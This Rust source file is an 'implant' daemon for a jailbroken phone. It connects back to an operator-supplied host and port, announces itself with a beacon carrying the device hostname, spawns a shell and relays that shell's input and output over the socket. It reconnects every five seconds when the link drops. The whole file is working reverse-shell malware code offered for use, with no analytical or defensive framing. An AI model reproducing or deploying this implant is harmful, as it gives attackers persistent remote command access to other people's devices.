/* Documntation:
implant runs on the jailbroken phone as a daemon binary.
connect -> beacon -> pump shell both ways on two threads.
*/
use ravenna::frame;
use ravenna::proto::{Beacon, Envelope, ShellData, ShellExit, ShellStart, envelope};
use ravenna::shell;
use ravenna::socket::{Sock, SockRole};
use std::ffi::CStr;
use std::sync::Arc;

fn _implant_id() -> String {
    let mut _buf = [0u8; 64];
    unsafe {
        libc::gethostname(_buf.as_mut_ptr() as *mut libc::c_char, _buf.len());
    }
    let _s = CStr::from_bytes_until_nul(&_buf)
        .map(|_c| _c.to_string_lossy().trim().to_owned())
        .unwrap_or_default();
    if _s.is_empty() { "implant0".into() } else { _s }
}

fn _env(_m: envelope::M) -> Envelope {
    Envelope { m: Some(_m) }
}

fn _beacon(_sock: &Sock, _id: &str) {
    let _b = _env(envelope::M::B(Beacon {
        implant_id: _id.into(),
    }));
    let _s = _env(envelope::M::S(ShellStart {
        implant_id: _id.into(),
    }));
    frame::send_msg(_sock, &_b);
    frame::send_msg(_sock, &_s);
}

fn _up(_sock: Arc<Sock>, _out_fd: libc::c_int, _pid: libc::pid_t) {
    let mut _out = [0u8; 4096];
    loop {
        let _n = shell::shell_read(_out_fd, &mut _out);
        if _n <= 0 {
            _exit_notice(&_sock, _pid);
            break;
        }
        let _m = envelope::M::D(ShellData {
            chunk: _out[.._n as usize].to_vec(),
        });
        frame::send_msg(&_sock, &_env(_m));
    }
}

fn _exit_notice(_sock: &Sock, _pid: libc::pid_t) {
    let mut _st = 0 as libc::c_int;
    if unsafe { libc::waitpid(_pid, &mut _st, libc::WNOHANG) } == _pid {
        frame::send_msg(_sock, &_env(envelope::M::E(ShellExit { code: _st })));
    }
}

fn _down(_sock: Arc<Sock>, _in_fd: libc::c_int) {
    while let Some(_e) = frame::recv_msg(&_sock) {
        if let Some(envelope::M::D(_d)) = _e.m {
            shell::shell_write(_in_fd, &_d.chunk);
        }
    }
}

fn _close(_sock: &Sock, _sh: &shell::Shell) {
    unsafe {
        libc::shutdown(_sock.fd(), libc::SHUT_RDWR);
        libc::close(_sh.stdin_fd);
        libc::close(_sh.stdout_fd);
    }
}

fn _pump(_sock: Sock) {
    let _sock = Arc::new(_sock);
    _beacon(&_sock, &_implant_id());
    let _sh = shell::spawn_shell();
    let _s1 = _sock.clone();
    let _s2 = _sock.clone();
    let (_out_fd, _in_fd, _pid) = (_sh.stdout_fd, _sh.stdin_fd, _sh.pid);
    let _t1 = std::thread::spawn(move || _up(_s1, _out_fd, _pid));
    let _t2 = std::thread::spawn(move || _down(_s2, _in_fd));
    let _ = _t1.join();
    _close(&_sock, &_sh);
    let _ = _t2.join();
}

fn main() {
    let _args: Vec<String> = std::env::args().collect();
    let _host = _args.get(1).cloned().unwrap_or_else(|| "127.0.0.1".into());
    let _port: u16 = _args.get(2).and_then(|_p| _p.parse().ok()).unwrap_or(8080);
    loop {
        eprintln!("implant trying {_host}:{_port} ...");
        _pump(Sock::new(SockRole::Client {
            host: _host.clone(),
            port: _port,
        }));
        eprintln!("lost server, sleeping 5s ...");
        std::thread::sleep(std::time::Duration::from_secs(5));
    }
}
